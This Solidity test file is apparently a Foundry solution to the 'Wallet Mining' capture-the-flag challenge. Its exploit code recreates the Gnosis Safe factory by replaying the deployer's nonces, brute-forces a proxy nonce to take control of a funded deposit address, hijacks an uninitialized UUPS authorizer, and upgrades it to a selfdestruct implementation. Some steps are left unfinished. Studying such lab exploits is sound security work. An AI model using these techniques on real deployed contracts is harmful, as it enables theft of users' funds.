// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/Test.sol";

import {Utilities} from "../../utils/Utilities.sol";
import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";

import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {WalletDeployer, IERC20} from "../../../src/Contracts/wallet-mining/WalletDeployer.sol";
import {AuthorizerUpgradeable} from "../../../src/Contracts/wallet-mining/AuthorizerUpgradeable.sol";

import {GnosisSafe} from "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import {GnosisSafeProxyFactory} from "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import {NewImplementation} from "./NewImplementation.sol";

contract WalletMining is Test {
    DamnValuableToken dvt;
    Utilities utils;
    WalletDeployer walletDeployer;
    AuthorizerUpgradeable authorizer;
    ERC1967Proxy proxy;
    address deployer;
    address player;
    address ward;
    address[] users;

    address DEPOSIT_ADDRESS = 0x9B6fb606A9f5789444c17768c6dFCF2f83563801;
    uint256 constant DEPOSIT_TOKEN_AMOUNT = 20_000_000e18;

    function setUp() public {
        utils = new Utilities();
        users = utils.createUsers(3);
        deployer = users[0];
        player = users[1];
        ward = users[2];

        vm.label(deployer, "Deployer");
        vm.label(player, "Player");
        vm.label(ward, "Ward");

        // Deploy Damn Valuable Token contract
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        // Deploy the authorizer behind a proxy using UUPS pattern
        // Data to pass to init function
        address[] memory _wards = new address[](1);
        address[] memory _aims = new address[](1);
        _wards[0] = ward;
        _aims[0] = DEPOSIT_ADDRESS;

        bytes memory data = abi.encodeWithSignature(
            "init(address[],address[])",
            _wards,
            _aims
        );

        vm.startPrank(deployer);
        authorizer = new AuthorizerUpgradeable();

        proxy = new ERC1967Proxy(address(authorizer), data);
        vm.label(address(proxy), "Proxy");
        vm.stopPrank();

        assertEq(AuthorizerUpgradeable(address(proxy)).owner(), deployer);
        assertTrue(
            AuthorizerUpgradeable(address(proxy)).can(ward, DEPOSIT_ADDRESS)
        );
        assertFalse(
            AuthorizerUpgradeable(address(proxy)).can(player, DEPOSIT_ADDRESS)
        );

        // Deploy safe deployer contract
        vm.prank(deployer);
        walletDeployer = new WalletDeployer(address(dvt));
        vm.label(address(walletDeployer), "Wallet Deployer");
        assertEq(walletDeployer.chief(), deployer);
        assertEq(walletDeployer.gem(), address(dvt));

        // Set authorizer in safe deployer
        vm.prank(deployer);
        walletDeployer.rule(address(proxy));
        assertEq(walletDeployer.mom(), address(proxy));

        bool success = walletDeployer.can(ward, DEPOSIT_ADDRESS);
        assertTrue(success);

        /* the call is reverting. expectRevert seems not working either. don't how to fix yet
         bool status = walletDeployer.can(player, DEPOSIT_ADDRESS);
         assertFalse(status) */

        // Fund Safe Deployer with tokens
        uint256 initialWalletDeployerTokenBalance = walletDeployer.pay() * 43;
        dvt.transfer(
            address(walletDeployer),
            initialWalletDeployerTokenBalance
        );

        // Ensure these accounts start empty
        assertEq(DEPOSIT_ADDRESS.code, "");
        assertEq(address(walletDeployer.fact()).code, "");
        assertEq(address(walletDeployer.copy()).code, "");

        // Deposit large amount of DVT tokens to the deposit address
        dvt.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Ensure initial balances are set correctly
        assertEq(dvt.balanceOf(DEPOSIT_ADDRESS), DEPOSIT_TOKEN_AMOUNT);
        assertEq(
            dvt.balanceOf(address(walletDeployer)),
            initialWalletDeployerTokenBalance
        );
        assertEq(dvt.balanceOf(player), 0);

        uint256 walletNonce = vm.getNonce(address(walletDeployer.fact()));
        assertEq(walletNonce, 0);
    }

    function testExploit() public {
        // address that deployed safe and factory on mainnet
        address deploymentAddress = 0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A;
        vm.startBroadcast(address(deploymentAddress));

        // nonce = 0, deploy mastercopy
        GnosisSafe safe = new GnosisSafe();
        vm.label(address(safe), "MasterCopy Address");

        // nonce = 1, random transaction to increase nonce
        dvt.transfer(address(this), 0);

        // nonce = 2, deploy factory
        GnosisSafeProxyFactory factory = new GnosisSafeProxyFactory();
        vm.label(address(factory), "Proxy Factory");
        vm.stopBroadcast();

        // iterate through until find nonce for DEPOSIT_ADDRESS
        uint256 requiredNonce = computeAddress(address(factory));

        // data for proxy creation
        address[] memory owners = new address[](1);
        owners[0] = player;
        bytes memory proxyData = abi.encodeWithSignature(
            "setup(address[],uint256,address,bytes,address,address,uint256,address)",
            owners, // proxy owner
            1, // threshold
            0,
            0,
            address(dvt), // token address as fallback manager
            0,
            0,
            0
        );

        // create proxies until depositNonce
        for (uint256 i; i < requiredNonce; ++i) {
            factory.createProxy(address(safe), proxyData);
        }
        assertGt(vm.getNonce(DEPOSIT_ADDRESS), 0);

        // data for token transfer
        bytes memory tokenTransferData = abi.encodeWithSignature(
            "transfer(address,uint256)",
            player,
            dvt.balanceOf(DEPOSIT_ADDRESS)
        );

        // transfer 20 mln DVT tokens to player
        vm.startPrank(player);
        (bool success, ) = DEPOSIT_ADDRESS.call(tokenTransferData);
        require(success, "Token transfer failed");

        // initialize the authorizer
        // pass any parameteres as this plays no role
        authorizer.init(owners, owners);
        assertEq(authorizer.owner(), player);

        // deploy NewImplementation with selfdestruct
        NewImplementation newImplementation = new NewImplementation();

        // upgrade implementation
        bytes memory attackData = abi.encodeWithSignature("attack()");

        // selfdestruct only takes place at the and of the call. undortunately, for foundry that means that it will be invoked only by the end of a test or setUp
        authorizer.upgradeToAndCall(address(newImplementation), attackData);

        authorizer.owner();

        // drain the deployer
        // for (uint256 i; i < 43; ++i) {
        //     walletDeployer.drop("");
        // }
    }

    function validation() public {
        // nonce > 0 means contract has some code

        // Factory account must have code
        uint256 factoryNonce = vm.getNonce(address(walletDeployer.fact()));
        assertGt(factoryNonce, 0);

        // Master copy account must have code
        uint256 copyNonce = vm.getNonce(address(walletDeployer.copy()));
        assertGt(copyNonce, 0);

        // Deposit account must have code
        uint256 depositNonce = vm.getNonce(DEPOSIT_ADDRESS);
        assertGt(depositNonce, 0);

        // The deposit address and the Safe Deployer contract must not hold tokens
        assertEq(dvt.balanceOf(DEPOSIT_ADDRESS), 0);
        assertEq(dvt.balanceOf(address(walletDeployer)), 0);

        // Player must own all tokens
        assertEq(dvt.balanceOf(player), DEPOSIT_TOKEN_AMOUNT + 43e18);
    }

    function computeAddress(
        address contractAddress
    ) public view returns (uint256) {
        for (uint256 i = 1; i < 100000; ++i) {
            address depositAddress = computeCreateAddress(
                address(contractAddress),
                i
            );
            if (depositAddress == DEPOSIT_ADDRESS) {
                return i;
            }
        }
    }
}
